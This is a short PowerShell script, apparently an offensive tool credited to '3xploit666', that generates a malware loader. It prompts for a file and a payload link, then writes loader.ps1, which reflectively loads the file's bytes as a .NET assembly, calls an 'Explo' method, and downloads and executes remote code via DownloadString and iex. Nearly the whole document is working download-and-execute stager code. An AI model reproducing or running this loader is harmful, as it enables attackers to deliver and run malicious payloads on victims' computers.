$startlogin = @" 


              ███۞███████ ]▄▄▄▄▄▄▄▄▄▄▄▄▃
▂▄▅█████████▅▄▃▂
I███████████████████].
◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤...

 ..../""""""""|======[]
..../""""""""""""| 
/"""""""""""""""""""""""""\
\(@) (@) (@) (@) (@) (@)/

                                                                                    github.com/3xploit666
https://www.youtube.com/channel/UCVhfRASdVtTI6k4ie6Fi9ZQ/videos


  
"@;
Write-Host $startlogin -ForegroundColor DarkMagenta

function ConvertBytes {

param (
      [string]$in  = $( Read-Host "[***PATH FILE***]" ),
      [string]$in2  = $( Read-Host "[Inserta link payload]" )

     
)

Start-Sleep -s 2 

if (-Not (Test-Path $in)) { Read-Host "VERIFICA TU RUTA......." }

$bytes  =  [System.IO.File]::ReadAllBytes($in)  -join "," 

$path = "C:" + $env:HOMEPATH + "\loader.ps1"

$loader =  "[System.Reflection.Assembly]::Load([byte[]]($bytes));[Resurrect]::Explo();Start-sleep -s 3; `$dow =(new-object net.webclient).DownloadString('$in2');iex `$dow"

Write-Host "Archivo Generado.. en > "  $path

$loader | Out-File $path

}

ConvertBytes


